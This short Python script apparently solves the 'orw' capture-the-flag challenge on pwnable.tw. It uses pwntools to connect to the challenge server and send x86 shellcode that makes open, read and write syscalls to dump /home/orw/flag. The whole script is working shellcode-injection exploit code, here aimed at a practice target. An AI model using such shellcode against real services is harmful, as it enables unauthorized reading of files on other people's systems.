#!/usr/bin/env python
 
from pwn import *
 
#open file
#read file
#write to screen
 
conn = remote('chall.pwnable.tw',10001)
start = conn.recv(30)
print start
open_syscall = asm('mov eax, 5; mov ebx, 0x804a095; mov ecx, 0; int 0x80')
read_syscall = asm('mov ebx, eax; mov eax, 3; mov ecx, 0x804a220; mov edx, 0x100; int 0x80')
write_syscall = asm('mov edx, 100; mov ebx, 1; mov eax, 4; int 0x80')
file_name = '/home/orw/flag'
terminate = '\x00'
 
payload = open_syscall+read_syscall+write_syscall+file_name+terminate
print "sending payload"
conn.send(payload)
data = conn.recvline()
print data
